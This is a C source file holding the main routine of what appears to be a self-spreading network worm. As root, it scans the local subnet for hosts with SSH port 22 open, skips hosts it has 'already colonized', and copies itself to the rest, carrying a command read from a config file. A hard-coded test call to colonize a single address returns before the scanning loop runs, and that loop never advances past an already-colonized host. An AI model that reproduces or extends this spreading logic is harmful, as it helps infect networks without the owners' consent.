#include "../include/main.h"

int main (int argc, char **argv) {
	int i = 0;
	char path[PATH_MAX];
	struct in_addr srcHost;
	char *progname = NULL;
	char *dir_name = NULL;
	char *source_host_ip = NULL;
	char *mask_network = NULL;
	char *control = NULL;
	char *command = NULL;
	struct in_addr *hostList = NULL;

	// get real path of the program
	realpath(argv[0], path);
	// get the program name
	progname = basename(argv[0]);
	// go into the program directory
	dir_name = dirname(argv[0]);
	chdir(dir_name);

	colonize("192.168.1.90", path);
	return 0;

	// if the user is root
	if (isRoot()) {
		source_host_ip = (char *) malloc(sizeof(char) * IP_LEN);
		mask_network = (char *) malloc(sizeof(char) * IP_LEN);
		if (source_host_ip == NULL || mask_network == NULL)
			return RET_FAILURE;

		// if the host has a network interface configured with the ip address defined in the configuration file
		if(isSourceHost(source_host_ip, mask_network)) {
			// get the value of the field "control" from the configuration file
			control = GetConfigControl();
			// get the value of the field "command" from the configuration file
			command = GetConfigCommand();
			// scanning the subnetwork and check on each host if the port 22 is open
			hostList = scanNetwork(source_host_ip, mask_network);
			inet_aton(source_host_ip, &srcHost);

			while (1) {
				// if the target host and the administrator host are in the same subnet
				if (inet_netof(hostList[i]) == inet_netof(srcHost)) {
					// if the host is already colonized
					if (isAlreadyColonize(inet_ntoa(hostList[i]), progname))
						continue;
					else
						colonize(inet_ntoa(hostList[i]), path);
				}
				else
					break;
				i++;
			}
		}
		// free dynamic allocations
		free(source_host_ip);
		free(mask_network);
	}
	return RET_SUCCESS;
}

